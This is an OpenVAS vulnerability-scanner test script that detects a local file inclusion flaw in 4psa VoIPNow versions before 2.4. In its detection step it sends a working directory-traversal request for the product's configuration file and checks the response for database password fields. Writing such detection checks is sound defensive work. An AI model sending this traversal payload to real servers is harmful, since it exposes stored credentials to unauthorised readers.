###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_4psa_voipnow_lfi_vuln.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# 4psa Voipnow Local File Inclusion Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803195");
  script_version("$Revision: 11865 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-04-22 18:28:32 +0530 (Mon, 22 Apr 2013)");
  script_name("4psa Voipnow Local File Inclusion Vulnerability");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121374");
  script_xref(name:"URL", value:"http://bot24.blogspot.in/2013/04/voipnow-24-local-file-inclusion.html");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 443);
  script_mandatory_keys("voipnow/banner");

  script_tag(name:"impact", value:"Successful exploitation will allow an attacker to view files and execute
  local scripts in the context of the application.");
  script_tag(name:"affected", value:"4psa voipnow version prior to 2.4");
  script_tag(name:"insight", value:"The flaw is due to an improper validation of user-supplied input to
  the 'screen' parameter in '/help/index.php?', which allows attackers
  to read arbitrary files via a ../(dot dot) sequences.");
  script_tag(name:"solution", value:"Upgrade to 4psa voipnow 2.4 or later.");
  script_tag(name:"summary", value:"This host is running 4psa Voipnow and is prone to local file
  inclusion vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://www.4psa.com/products-voipnow-spe.html");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:443);
res = http_get_cache(item:"/", port:port);

if("VOIPNOW=" >< res && "Server: voipnow" >< res)
{
  url = '/help/index.php?screen=../../../../../../../../etc/voipnow/voipnow.conf';
  req = http_get(port:port, item:url);
  res = http_keepalive_send_recv(port:port, data:req);

  if("VOIPNOWCALLAPID_RC_D" >< res && "VOIPNOW_ROOT_D" >< res &&
     'Database location' >< res && "DB_PASSWD" >< res)
  {
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
